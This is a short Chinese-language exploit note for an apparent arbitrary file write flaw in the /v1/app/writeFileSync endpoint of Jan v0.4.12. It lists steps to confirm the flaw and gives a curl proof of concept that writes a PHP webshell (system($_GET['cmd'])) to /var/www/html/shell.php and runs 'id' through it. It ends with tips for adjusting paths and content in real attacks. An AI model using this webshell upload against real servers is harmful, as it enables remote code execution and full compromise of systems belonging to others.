验证漏洞存在方法
    - 检查目标系统是否运行Jan v0.4.12版本
    - 尝试访问/v1/app/writeFileSync接口，确认是否存在文件上传功能
    - 验证是否可以通过该接口上传任意文件到服务器任意位置

漏洞利用方法
    - 该漏洞存在于Jan v0.4.12的/v1/app/writeFileSync接口中，由于缺乏对上传文件的路径和内容进行充分验证，攻击者可以上传任意文件到服务器上的任意位置
    - 攻击者可以通过构造恶意请求，上传包含恶意代码的文件（如webshell）到可执行目录，从而实现远程代码执行
    
PoC示例：
```bash
# 构造恶意文件上传请求
curl -X POST http://target:port/v1/app/writeFileSync \
  -H "Content-Type: application/json" \
  -d '{
    "path": "/var/www/html/shell.php",
    "content": "<?php system($_GET[\"cmd\"]); ?>"
  }'

# 验证文件是否成功上传
curl http://target:port/shell.php?cmd=id
```

注意事项：
1. 该漏洞需要Jan服务运行在可访问的网络环境中
2. 上传的文件路径需要具有可执行权限
3. 实际利用时可能需要根据目标环境调整文件路径和内容
